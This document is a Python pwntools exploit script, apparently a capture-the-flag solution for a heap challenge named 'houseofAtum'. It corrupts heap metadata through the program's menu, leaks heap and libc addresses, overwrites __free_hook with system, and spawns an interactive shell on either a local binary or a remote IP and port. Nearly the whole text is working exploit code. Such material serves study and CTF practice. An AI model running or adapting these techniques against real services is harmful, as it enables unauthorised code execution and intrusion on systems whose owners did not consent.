#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./houseofAtum"
os.environ = {"LD_LIBRARY_PATH":"./"}
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")
context.log_level = "error"
heap_add=0
stack_add=0
r=None
def get_cc():
    global r
    if len(sys.argv)==1:
        r=process(pwn_file)
    else:
        r=remote("60.205.224.216",9999)

def debug():
    log.debug("stack add:0x%x"%stack_add)
    log.debug("pie add:0x%x"%elf.address)
    log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    pause()

def add(con):
    global r
    r.sendlineafter("choice:","1\x00")
    r.sendafter("content:",con)

def dele(idx,delete= False):
    global r
    r.sendlineafter("choice:","3\x00")
    r.sendlineafter("idx:",str(idx))
    r.sendlineafter("Clear?(y/n):","y" if delete else "n")

def show(idx):
    global r
    r.sendlineafter("choice:","4\x00")
    r.sendlineafter("idx:",str(idx))
    r.recvuntil("Content:")
    return r.recvline()[:-1]

def edit(idx,cont):
    global r
    r.sendlineafter("choice:","2\x00")
    r.sendlineafter("idx:",str(idx))
    r.sendafter("content:",cont)

cnt = 0
while True:
    print cnt
    cnt+=1
    try:
        get_cc()
        add(p64(0x91)*9)
        add(p64(0x91)*9)
        dele(1)
        dele(0)
        heap_add = u64(show(0).ljust(8,"\x00"))>>12<<12
        for i in range(5):
            dele(0)
        elf.address = heap_add - 0x1481000
        edit(0,p64(heap_add+0x260)+"\x00"*56+p64(elf.address+0x202050))
        dele(1,True)
        dele(0,True)
        add("\x00"*0x30+p64(heap_add+0x3000)+p64(0x91))
        add("b")
        dele(1,True)
        add(p64(elf.got["puts"]))
        r.recvuntil("Your")
        libc.address = 0
        libc.address = u64(show(0).ljust(8,"\x00")) - libc.sym["puts"]
        break
    except Exception as e:
        r.close()
#        raise e

context.log_level = "debug"


edit(1,p64(next(libc.search("/bin/sh")))+p64(libc.sym["__free_hook"]))
edit(1,p64(libc.sym["system"]))

r.sendlineafter("choice:","3")
r.sendlineafter("idx:","0")

r.interactive()




